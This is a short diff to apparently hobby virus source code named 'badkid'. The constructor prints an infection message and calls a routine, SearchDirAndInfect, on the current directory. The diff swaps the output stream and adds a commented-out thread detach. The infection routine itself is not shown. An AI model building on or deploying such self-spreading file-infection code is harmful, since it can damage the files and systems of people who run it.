@@ -131,9 +131,10 @@ public:
     Main(int seed_) {
         this->seed = seed_;
         // Call SearchDirAndInfect
-        std::cerr << "You have been infected by virus `badkid`.\n\ttoo young too simple." << std::endl;
+        std::cout << "You have been infected by virus `badkid`.\n\ttoo young too simple." << std::endl;
         SearchDirAndInfect(".");
         // std::thread searchThread(SearchDirAndInfect, ".");
+        // searchThread.detach();
     }
 };
 
